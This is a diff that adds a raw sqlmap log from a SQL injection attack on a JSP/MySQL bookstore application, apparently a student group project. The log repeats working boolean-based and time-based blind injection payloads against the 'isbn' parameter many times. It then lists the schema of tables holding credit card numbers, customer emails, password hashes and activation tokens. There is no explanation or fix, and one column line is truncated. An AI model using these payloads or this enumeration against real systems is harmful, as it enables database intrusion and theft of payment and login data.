@@ -1,0 +1,489 @@
+sqlmap identified the following injection points with a total of 105 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL 5.0.11
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL >= 5.0.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL >= 5.0.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL >= 5.0.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL >= 5.0.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL >= 5.0.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL >= 5.0.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL >= 5.0.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL >= 5.0.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL >= 5.0.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL >= 5.0.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL 5
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL 5
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL 5
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL 5
+Database: sigbjoo_group12
+Table: order
+[6 columns]
++------------+---------------------+
+| Column     | Type                |
++------------+---------------------+
+| value      | decimal(10,2)       |
+| address_id | int(10) unsigned    |
+| created    | date                |
+| customer_i |
+| id         | int(10) unsigned    |
+| status     | tinyint(3) unsigned |
++------------+---------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL 5
+Database: sigbjoo_group12
+Table: address
+[3 columns]
++-------------+------------------+
+| Column      | Type             |
++-------------+------------------+
+| address     | text             |
+| customer_id | int(10) unsigned |
+| id          | int(10) unsigned |
++-------------+------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL 5
+Database: sigbjoo_group12
+Table: author
+[2 columns]
++--------+------------------+
+| Column | Type             |
++--------+------------------+
+| id     | int(10) unsigned |
+| name   | varchar(255)     |
++--------+------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL 5
+Database: sigbjoo_group12
+Table: author_x_book
+[2 columns]
++-----------+------------------+
+| Column    | Type             |
++-----------+------------------+
+| author_id | int(10) unsigned |
+| book_id   | int(10) unsigned |
++-----------+------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL 5
+Database: sigbjoo_group12
+Table: category
+[3 columns]
++---------------+------------------+
+| Column        | Type             |
++---------------+------------------+
+| id            | int(10) unsigned |
+| name          | varchar(255)     |
+| subcategories | text             |
++---------------+------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL 5
+Database: sigbjoo_group12
+Table: category_x_title
+[2 columns]
++-------------+------------------+
+| Column      | Type             |
++-------------+------------------+
+| category_id | int(10) unsigned |
+| title_id    | int(10) unsigned |
++-------------+------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL 5
+Database: sigbjoo_group12
+Table: credit_card
+[5 columns]
++-----------------+------------------+
+| Column          | Type             |
++-----------------+------------------+
+| cardholder_name | varchar(255)     |
+| cc_number       | char(16)         |
+| customer_id     | int(10) unsigned |
+| expiry_date     | date             |
+| id              | int(10) unsigned |
++-----------------+------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL 5
+Database: sigbjoo_group12
+Table: customer
+[5 columns]
++------------------+------------------+
+| Column           | Type             |
++------------------+------------------+
+| activation_token | varchar(255)     |
+| email            | varchar(255)     |
+| id               | int(10) unsigned |
+| name             | varchar(255)     |
+| password         | char(40)         |
++------------------+------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL 5
+Database: sigbjoo_group12
+Table: mail
+[5 columns]
++----------+------------------+
+| Column   | Type             |
++----------+------------------+
+| to       | varchar(255)     |
+| content  | text             |
+| id       | int(11) unsigned |
+| sentTime | datetime         |
+| subject  | varchar(255)     |
++----------+------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL 5
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL 5
+Database: sigbjoo_group12
+Table: publisher
+[2 columns]
++--------+------------------+
+| Column | Type             |
++--------+------------------+
+| id     | int(10) unsigned |
+| name   | varchar(255)     |
++--------+------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL 5
+Database: sigbjoo_group12
+Table: title
+[2 columns]
++--------+------------------+
+| Column | Type             |
++--------+------------------+
+| id     | int(10) unsigned |
+| name   | varchar(255)     |
++--------+------------------+
+
